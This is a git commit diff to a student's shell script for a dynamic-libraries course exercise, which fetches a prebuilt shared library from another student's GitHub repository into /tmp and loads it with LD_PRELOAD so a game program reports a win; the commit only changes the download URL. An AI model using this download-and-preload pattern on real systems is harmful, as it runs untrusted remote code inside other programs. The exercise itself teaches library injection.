90becf236111382b3f5f3c30381e48c93d2e414e
tarik khadri <tarikkhadri11@gmail.com>
2023-12-12 13:20:14 -0800

    fix

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,4 @@
+
 #!/bin/bash
-wget -P /tmp https://github.com/tarikkhadri7099/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libgiga.so
-export LD_PRELOAD=/tmp/libgiga.so
+wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
+export LD_PRELOAD=/tmp/putshack.so
